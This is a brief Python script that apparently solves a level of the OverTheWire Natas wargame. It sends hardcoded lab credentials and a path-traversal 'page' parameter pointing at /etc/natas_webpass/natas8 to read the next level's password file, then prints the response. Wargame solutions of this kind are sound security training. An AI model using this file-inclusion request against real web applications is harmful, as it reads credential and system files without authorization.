#!/usr/bin/env python

import requests
import json
NATAS = "natas7"
PASS = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'
URL = "http://" + NATAS + ".natas.labs.overthewire.org/index.php?page=%2Fetc%2Fnatas_webpass%2Fnatas8"
#payload = { 'secret': 'FOEIUWGHFEEUHOFUOIU', 'submit': True }
r = requests.get(URL , auth=(NATAS, PASS))

print(r.text)
print(r.history)
print(r.status_code)


print(r.headers)